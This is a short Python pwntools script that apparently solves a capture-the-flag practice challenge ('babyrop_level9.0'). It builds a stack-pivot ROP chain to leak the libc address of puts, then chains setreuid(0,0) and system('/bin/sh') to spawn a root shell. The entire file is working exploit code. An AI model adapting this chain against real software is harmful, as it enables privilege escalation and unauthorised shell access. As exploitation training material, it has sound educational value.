from pwn import *
#context.terminal = ['tmux', 'splitw', '-h']
#p = gdb.debug("/challenge/babyrop_level9.0", gdbscript="source /opt/gef/gef.py")
p = process("/challenge/babyrop_level9.0")
buf = b"A" * (0x00)
context.arch = 'amd64'

elf = ELF("/challenge/babyrop_level9.0")
rop = ROP(elf)
rsp_value = 0x4150E0 + 0x10
pop_rdi = rop.rdi.address
pop_rsp = 0x4014b4 #pop rsp ; pop r13 ; pop rbp ; ret # rop.rsp.address
puts_plt = elf.plt.puts
puts_got = elf.got.puts
start = elf.sym['_start']
rop.raw(pop_rsp)
rop.raw(rsp_value)
rop.raw(0)
rop.raw(0)
rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(start)
payload = buf + rop.chain()

p.send(payload)
p.recvuntil(b"Leaving!\n")
leak = unpack(p.recvuntil(b"\n")[:-1], 'all')

libc = ELF(p.libc.path)
put_function_in_libc_offset = libc.symbols['puts']
libc.address = leak - put_function_in_libc_offset

rop = ROP(libc)
pop_rdi = rop.rdi.address
pop_rdx = rop.rdx_r12.address

syscall = rop.syscall.address
s_a = next(libc.search(b"/bin/sh\x00"))
rop.raw(pop_rsp)
rop.raw(rsp_value)
rop.raw(0)
rop.raw(0)
rop.raw(pop_rdx)
rop.raw(0)
rop.raw(0)
rop.setreuid(0,0)
rop.system(s_a)

payload = buf + rop.chain()

p.send(payload)
p.interactive()
